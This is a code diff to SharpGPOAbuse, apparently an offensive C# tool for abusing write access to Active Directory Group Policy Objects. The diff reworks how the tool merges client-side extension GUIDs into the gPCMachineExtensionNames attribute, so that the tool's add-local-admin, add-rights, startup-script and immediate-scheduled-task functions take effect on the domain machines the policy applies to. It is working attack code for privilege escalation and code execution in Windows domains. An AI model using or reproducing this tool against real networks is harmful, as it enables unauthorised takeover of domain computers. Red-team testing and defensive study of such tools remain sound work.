@@ -173,53 +173,245 @@ namespace SharpGPOAbuse
                 entryToUpdate.Properties["versionNumber"].Value = new_ver;
 
 
-                // update gPCMachineExtensionNames to add local admin
-                if (function == "AddLocalAdmin" || function == "AddNewRights")
+
+                // update gPCMachineExtensionNames
+                String val1 = "";
+                String val2 = "";
+                if (function == "AddLocalAdmin" || function == "AddNewRights" || function == "NewStartupScript")
                 {
+
+                    if (function == "AddLocalAdmin" || function == "AddNewRights")
+                    {
+                        val1 = "827D319E-6EAC-11D2-A4EA-00C04F79F83A";
+                        val2 = "803E14A0-B4FB-11D0-A0D0-00A0C90F574B";
+                    }
+
+                    if (function == "NewStartupScript")
+                    {
+                        val1 = "42B5FAAE-6536-11D2-AE5A-0000F87571E3";
+                        val2 = "40B6664F-4972-11D1-A7CA-0000F87571E3";
+                    }
+
                     try
                     {
-                        if (!entryToUpdate.Properties["gPCMachineExtensionNames"].Value.ToString().Contains("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]"))
+                        if (!entryToUpdate.Properties["gPCMachineExtensionNames"].Value.ToString().Contains(val2))
                         {
-                            entryToUpdate.Properties["gPCMachineExtensionNames"].Value += "[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]";
+                            if (entryToUpdate.Properties["gPCMachineExtensionNames"].Value.ToString().Contains(val1))
+                            {
+                                string ent = entryToUpdate.Properties["gPCMachineExtensionNames"].Value.ToString();
+
+                                //Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + ent);
+
+                                List<string> new_values = new List<string>();
+                                String addition = val2;
+                                var test = ent.Split('[');
+
+                                foreach (string i in test)
+                                {
+                                    new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
+                                }
+                                //new_values.Add(addition);
+
+                                for (var i = 1; i < new_values.Count; i++)
+                                {
+                                    if (new_values[i].Contains(val1))
+                                    {
+                                        //Console.WriteLine(new_values[i]);
+                                        List<string> toSort = new List<string>();
+                                        string[] test2 = new_values[i].Split();
+                                        for (var f = 1; f < test2.Length; f++)
+                                        {
+                                            //Console.WriteLine(test2[f]);
+                                            toSort.Add(test2[f]);
+                                        }
+                                        toSort.Add(addition);
+                                        toSort.Sort();
+                                        new_values[i] = test2[0];
+                                        foreach (string val in toSort)
+                                        {
+                                            new_values[i] += " " + val;
+                                        }
+                                    }
+                                }
+
+                                List<string> new_values2 = new List<string>();
+                                for (var i = 0; i < new_values.Count; i++)
+                                {
+                                    if (string.IsNullOrEmpty(new_values[i])) { continue; }
+                                    string[] value1 = new_values[i].Split();
+                                    string new_val = "";
+                                    for (var q = 0; q < value1.Length; q++)
+                                    {
+                                        if (string.IsNullOrEmpty(value1[q])) { continue; }
+                                        new_val += "{" + value1[q] + "}";
+                                    }
+                                    new_val = "[" + new_val + "]";
+                                    new_values2.Add(new_val);
+                                }
+                                String final = string.Join("", new_values2.ToArray());
+                                //Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
+                                entryToUpdate.Properties["gPCMachineExtensionNames"].Value = final;
+                            }
+
+                            else
+                            {
+                                string ent = entryToUpdate.Properties["gPCMachineExtensionNames"].Value.ToString();
+                                //Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + ent);
+                                List<string> new_values = new List<string>();
+                                String addition = val1 + " " + val2;
+                                var test = ent.Split('[');
+
+                                foreach (string i in test)
+                                {
+                                    new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
+                                }
+                                new_values.Add(addition);
+                                new_values.Sort();
+                                List<string> new_values2 = new List<string>();
+
+                                for (var i = 0; i < new_values.Count; i++)
+                                {
+                                    if (string.IsNullOrEmpty(new_values[i])) { continue; }
+                                    string[] value1 = new_values[i].Split();
+                                    string new_val = "";
+                                    for (var q = 0; q < value1.Length; q++)
+                                    {
+                                        if (string.IsNullOrEmpty(value1[q])) { continue; }
+                                        new_val += "{" + value1[q] + "}";
+                                    }
+                                    new_val = "[" + new_val + "]";
+                                    new_values2.Add(new_val);
+                                }
+                                String final = string.Join("", new_values2.ToArray());
+                                //Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
+                                entryToUpdate.Properties["gPCMachineExtensionNames"].Value = final;
+                            }
+
+                        }
+                        else
+                        {
+                            Console.WriteLine("[!] DEBUG: the value of gPCMachineExtensionNames was already set.");
                         }
                     }
+                    // the following will execute when the gPCMachineExtensionNames is <not set>
                     catch
                     {
-                        entryToUpdate.Properties["gPCMachineExtensionNames"].Value = "[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]";
+                        entryToUpdate.Properties["gPCMachineExtensionNames"].Value = "[{" + val1 + "}{" + val2 + "}]";
                     }
-                }
 
+                }
 
                 // update gPCMachineExtensionNames to add immediate task
                 if (function == "NewImmediateTask")
                 {
+                    val1 = "00000000-0000-0000-0000-000000000000";
+                    val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72";
+                    string val3 = "AADCED64-746C-4633-A97C-D61349046527";
+
                     try
                     {
-                        if (!entryToUpdate.Properties["gPCMachineExtensionNames"].Value.ToString().Contains("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"))
+                        if (!entryToUpdate.Properties["gPCMachineExtensionNames"].Value.ToString().Contains(val2))
                         {
-                            entryToUpdate.Properties["gPCMachineExtensionNames"].Value += "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]";
+                            string toUpdate = entryToUpdate.Properties["gPCMachineExtensionNames"].Value.ToString();
+                            //Console.WriteLine("[!] DEBUG: Old gPCMachineExtensionNames: " + toUpdate);
+
+                            List<string> new_values = new List<string>();
+                            var test = toUpdate.Split('[');
+
+                            foreach (string i in test)
+                            {
+                                new_values.Add(i.Replace("{", "").Replace("}", " ").Replace("]", ""));
+                            }
+
+                            // if zero GUID not in current value
+                            if (!toUpdate.Contains(val1))
+                            {
+                                new_values.Add(val1 + " " + val2);
+                            }
+
+                            // if zero GUID exists in current value
+                            else if (toUpdate.Contains(val1))
+                            {
+                                for (var k = 0; k < new_values.Count; k++)
+                                {
+                                    if (new_values[k].Contains(val1))
+                                    {
+                                        List<string> toSort = new List<string>();
+                                        string[] test2 = new_values[k].Split();
+                                        for (var f = 1; f < test2.Length; f++)
+                                        {
+                                            toSort.Add(test2[f]);
+                                        }
+                                        toSort.Add(val2);
+                                        toSort.Sort();
+                                        new_values[k] = test2[0];
+                                        foreach (string val in toSort)
+                                        {
+                                            new_values[k] += " " + val;
+                                        }
+                                    }
+                                }
+                            }
+
+                            // if Scheduled Tasks GUID not in current value
+                            if (!toUpdate.Contains(val3))
+                            {
+                                new_values.Add(val3 + " " + val2);
+                            }
+
+                            else if (toUpdate.Contains(val3))
+                            {
+                                for (var k = 0; k < new_values.Count; k++)
+                                {
+                                    if (new_values[k].Contains(val3))
+                                    {
+                                        List<string> toSort = new List<string>();
+                                        string[] test2 = new_values[k].Split();
+                                        for (var f = 1; f < test2.Length; f++)
+                                        {
+                                            toSort.Add(test2[f]);
+                                        }
+                                        toSort.Add(val2);
+                                        toSort.Sort();
+                                        new_values[k] = test2[0];
+                                        foreach (string val in toSort)
+                                        {
+                                            new_values[k] += " " + val;
+                                        }
+                                    }
+                                }
+                            }
+
+                            new_values.Sort();
+
+                            List<string> new_values2 = new List<string>();
+                            for (var i = 0; i < new_values.Count; i++)
+                            {
+                                if (string.IsNullOrEmpty(new_values[i])) { continue; }
+                                string[] value1 = new_values[i].Split();
+                                string new_val = "";
+                                for (var q = 0; q < value1.Length; q++)
+                                {
+                                    if (string.IsNullOrEmpty(value1[q])) { continue; }
+                                    new_val += "{" + value1[q] + "}";
+                                }
+                                new_val = "[" + new_val + "]";
+                                new_values2.Add(new_val);
+                            }
+                            String final = string.Join("", new_values2.ToArray());
+                            //Console.WriteLine("[!] DEBUG: New gPCMachineExtensionNames: " + final);
+                            entryToUpdate.Properties["gPCMachineExtensionNames"].Value = final;
                         }
+                        else
+                        {
+                            //Console.WriteLine("[!] DEBUG: the value of gPCMachineExtensionNames was already set.");
+                        }
+
                     }
+                    // the following will execute when the gPCMachineExtensionNames is <not set>
                     catch
                     {
-                        entryToUpdate.Properties["gPCMachineExtensionNames"].Value = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]";
-                    }
-                }
-
-
-                // update gPCMachineExtensionNames to add startup script
-                if (function == "NewStartupScript")
-                {
-                    try
-                    {
-                        if (!entryToUpdate.Properties["gPCMachineExtensionNames"].Value.ToString().Contains("[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]"))
-                        {
-                            entryToUpdate.Properties["gPCMachineExtensionNames"].Value += "[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]";
-                        }
-                    }
-                    catch
-                    {
-                        entryToUpdate.Properties["gPCMachineExtensionNames"].Value = "[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]";
+                        entryToUpdate.Properties["gPCMachineExtensionNames"].Value = "[{" + val1 + "}{" + val2 + "}]" + "[{" + val3 + "}{" + val2 + "}]";
                     }
                 }
 
